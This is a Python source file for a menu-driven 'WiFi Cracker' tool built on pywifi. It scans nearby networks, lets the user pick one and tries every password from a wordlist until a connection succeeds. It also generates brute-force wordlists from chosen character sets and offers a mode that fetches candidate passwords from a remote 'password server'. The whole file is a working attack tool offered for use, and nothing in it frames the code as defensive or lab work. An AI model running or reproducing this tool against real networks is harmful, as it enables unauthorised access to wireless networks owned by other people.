import os
import sys
import time
import itertools as its
import tkinter
from tkinter import filedialog as fd

import pywifi
from pywifi import const  # 引入一个常量

import client

root = tkinter.Tk()
root.withdraw()


def cls():  # function to clear the screen
    '''
    Clear the screen
    :return:
    '''
    if sys.platform == "win32" or sys.platform == "win64":  # if the platform is Windows
        os.system("cls")  # clear the screen
    elif sys.platform == "linux" or sys.platform == "linux2":  # if the platform is Linux
        os.system("clear")  # clear the screen


def main():  # function to show the main menu
    '''
    Show the main menu
    :return:
    '''
    cls()  # clear the screen
    text = ''' _       __   _    ______   _          
| |     / /  (_)  / ____/  (_)         
| | /| / /  / /  / /_     / /          
| |/ |/ /  / /  / __/    / /           
|__/|__/_ /_/  /_/      /_/            
  / ____/________ ______/ /_____  _____
 / /   / ___/ __ `/ ___/ //_/ _ \/ ___/
/ /___/ /  / /_/ / /__/ ,< /  __/ /    
\____/_/   \__,_/\___/_/|_|\___/_/ '''
    print(text)

    print('1. Crack WiFi Password with Dictionary')  # show the menu
    print('2. Generate Dictionary')
    print('3. Crack WiFi Password with Password Server')
    print('4. Exit')
    print('\n')  # print a new line
    choice = input('Enter your choice: ')  # get the choice
    if choice == '1':  # if the choice is 1
        dictCrack()  # call the function to crack the WiFi password with dictionary
    elif choice == '2':  # if the choice is 2
        generateDict()  # call the function to generate a dictionary
    elif choice == '3':  # if the choice is 3
        svrCrack()  # call the function to crack the WiFi password with password server
    elif choice == '4':  # if the choice is 4
        sys.exit()  # exit the program
    else:  # if the choice is not 1, 2, 3, 4
        print('Invalid input')  # print an error message
        main()  # return to the main menu


def svrCrack():
    cls()  # clear screen
    host = input('Enter the host of the password server: ')  # get the host
    try:
        port = int(input('Enter the port of the password server: '))  # get the port
    except ValueError:
        cls()
        print('Invalid input')  # print an error message
        time.sleep(1)
        svrCrack()  # return to the main menu
    cli = client.client(host, port)  # create a client object
    cls()  # clear screen
    time.sleep(3)  # wait for 1 second
    cli.main()  # call the main function of the client object
    main()  # return to the main menu


def generateDict():
    '''
    start generate dictionary
    :return:
    '''
    cls()  # clear screen
    dictrange = input('Enter the range of the dictionary: ')  # input the range of the dictionary
    if dictrange == '':  # if the input is empty
        cls()  # clear screen
        sys.exit()  # exit the program
    else:  # if the input is not empty
        try:  # try to convert the input to int
            dictrange = int(dictrange) + 1  # add 1 to the input
        except:  # if the input is not an integer
            cls()  # clear screen
            print('Invalid input!')  # print error message
            sys.exit()  # exit the program
        if dictrange < 1:  # if the input is less than 1
            cls()  # clear screen
            print('Range must be greater than 1!')  # print error message
            sys.exit()  # exit the program
    words = ""  # create a string to store the words
    cls()  # clear screen
    nums = input('Do you want to generate numbers? (y/n): ')  # ask if the user want to generate numbers
    if nums.upper() == 'Y':  # if the user want to generate numbers
        words += '0123456789'  # add numbers to the string
    letters = input('Do you want to generate letters? (y/n): ')  # ask if the user want to generate letters
    if letters.upper() == 'Y':  # if the user want to generate letters
        words += 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'  # add letters to the string
    symbols = input('Do you want to generate symbols? (y/n): ')  # ask if the user want to generate symbols
    if symbols.upper() == 'Y':  # if the user want to generate symbols
        words += '!@#$%^&*()_+-=[]{}|;:<>?,./'  # add symbols to the string
    cls()  # clear screen
    if words == '':  # if the string is empty
        cls()  # clear screen
        print('No words selected!')  # print error message
        sys.exit()  # exit the program
    else:  # if the string is not empty
        cls()  # clear screen
        savepath = input(
            'Enter the path to save the dictionary (Press Enter to browse): ')  # input the path to save the dictionary
        if savepath == '':  # if the input is empty
            savepath = fd.asksaveasfilename(defaultextension='.txt', filetypes=(
            ('Text File', '*.txt'), ('All Files', '*.*')))  # ask the user to save the dictionary
            if savepath == '':  # if the user didn't save the dictionary
                cls()  # clear screen
                print('No path selected!')  # print error message
                sys.exit()  # exit the program
        else:  # if the input is not empty
            if os.path.exists(savepath):  # if the path already exists
                cls()  # clear screen
                print('File already exists!')  # print error message
                sys.exit()  # exit the program
        try:  # try to open the file
            f = open(savepath, 'w')  # open the file
        except:  # if the file can't be opened
            cls()  # clear screen
            print('Invalid path!')  # print error message
            sys.exit()  # exit the program
        for i in range(dictrange):  # for each number in the range
            temp = its.product(words, repeat=i)  # generate a product of the string and the number of words
            for j in temp:  # for each product
                try:
                    print('\r' + 'Writing ' + ''.join(j) + '  Press Ctrl+C to cancel', end='', flush=True)  # print the product and flush the output
                    f.write(''.join(j) + '\n')  # write the product to the file
                except KeyboardInterrupt:  # if the user pressed Ctrl+C
                    cls()  # clear screen
                    print('Cancelled!')  # print error message
                    f.close()  # close the file
                    time.sleep(1)  # wait 1 second
                    main()  # return to the main menu
        cls()  # clear screen
        print('Done!')  # print done message
        f.close()  # close the file
        main()  # return to the main menu


def connectWiFi(wifiname:str, wifipassword:str):  # function to connect to a WiFi network
    '''
    Connect to a WiFi network
    :param wifiname: String containing the name of the WiFi network
    :param wifipassword: String containing the password of the WiFi network
    :return: boolean: True if the connection was successful, False otherwise
    '''
    iface.disconnect()  # 断开连接
    time.sleep(0.5)  # 等待0.5秒
    if iface.status() == const.IFACE_DISCONNECTED:  # if the interface is disconnected
        profile = pywifi.Profile()  # 创建WiFi连接文件
        profile.ssid = wifiname  # WiFi的ssid，即wifi的名称
        profile.key = wifipassword  # WiFi密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WiFi的加密类型，现在一般的wifi都是wpa2psk
        profile.auth = const.AUTH_ALG_OPEN  # 开放网卡
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        iface.remove_all_network_profiles()  # 删除所有的WiFi文件
        tep_profile = iface.add_network_profile(profile)  # 设定新的连接文件
        iface.connect(tep_profile)  # 连接WiFi
        time.sleep(1.5)  # 等待1.5秒
        if iface.status() == const.IFACE_CONNECTED:  # if the interface is connected
            return True  # return True
        else:  # if the interface is not connected
            return False  # return False


def dictCrack():  # function to crack a WiFi by dictionary
    cls()  # clear screen
    iface.scan()  # 扫描WiFi
    result = iface.scan_results()  # get the scan results
    a = 0  # initialize the counter
    for i in range(len(result)):  # for each WiFi in the scan results
        print(str(i) + '. ', result[i].ssid, 'Signal:', result[i].signal)  # print the WiFi name and signal strength
        i += 1  # increment the counter
    print('\n')  # print a new line
    wifiindex = input('Select the WiFi you want to crack: ')  # ask the user to select a WiFi
    cls()  # clear screen
    wifiindex = int(wifiindex)  # convert the input to an integer
    wifiname = result[wifiindex].ssid  # get the WiFi name
    dictpath = input(
        'Enter the path of the dictionary (Press Enter to browse): ')  # ask the user to enter the path of the dictionary
    if dictpath == '':  # if the user didn't enter a path
        dictpath = fd.askopenfilename(defaultextension='.txt', filetypes=(
        ('Text File', '*.txt'), ('All Files', '*.*')))  # ask the user to browse for a file
        if dictpath == '':  # if the user didn't browse for a file
            cls()  # clear screen
            print('No dictionary selected!')  # print error message
            time.sleep(1)  # wait 1 second
            main()  # return to the main menu
    else:  # if the user entered a path
        if os.path.isfile(dictpath):  # if the path is a file
            pass  # do nothing
        else:  # if the path is not a file
            cls()  # clear screen
            print('Invalid dictionary path!')  # print error message
            time.sleep(1)  # wait 1 second
            main()  # return to the main menu
        filename = os.path.basename(dictpath)  # get the filename
        fileext = os.path.splitext(filename)[1]  # get the file extension
        if fileext == '.txt':  # if the file extension is .txt
            pass  # do nothing
        else:  # if the file extension is not .txt
            cls()  # clear screen
            print('Dictionary file format error!')  # print error message
            time.sleep(1)  # wait 1 second
            main()  # return to the main menu
    cls()  # clear screen
    print('Start cracking WiFi:', wifiname)  # print the WiFi name
    time.sleep(1)  # wait 1 second
    with open(dictpath, 'r') as f:  # open the dictionary file
        while True:
            pwd = f.readline()  # read a line from the dictionary file
            cls()  # clear screen
            print("Trying Password: " + pwd)  # print the password
            time.sleep(0.01)  # wait 0.01 second
            res = connectWiFi(wifiname, pwd)  # connect to the WiFi
            if res == True:  # if the connection is successful
                success(wifiname, pwd)  # print the success message
            if pwd == '':  # if the end of the file is reached
                break  # break the loop
    cls()  # clear screen
    print('No password found!')  # print error message


def success(wifiname, wifipassword):
    '''
    Print the success message
    :param wifiname:
    :param wifipassword:
    :return:
    '''
    cls()  # clear screen
    iface.disconnect()  # disconnect from the WiFi
    print('Password found!')  # print success message
    print('WiFi Name:', wifiname)  # print the WiFi name
    print('WiFi Password:', wifipassword)  # print the WiFi password
    print('Press any key to continue...')  # print a message
    os.system('pause >nul')  # pause the program
    main()  # return to the main menu


if __name__ == '__main__':  # if the program is run directly
    wifi = pywifi.PyWiFi()  # create a PyWiFi object
    try:  # try to connect to the WiFi device
        ifaces = wifi.interfaces()  # get the first interface
    except:  # if the connection failed
        print('Your system does not support WiFi.')  # print error message
        sys.exit()  # exit the program
    a = 0
    for iface in ifaces:
        a += 1
        name = iface.name()
        print(str(a) + '. ' + name)
    print('\n')
    while True:
        try:
            i = int(input('Please choose the interface you want to use:'))
            iface = ifaces[i - 1]
            break
        except:
            print('Please enter a number!')
            continue
    main()  # start the main menu
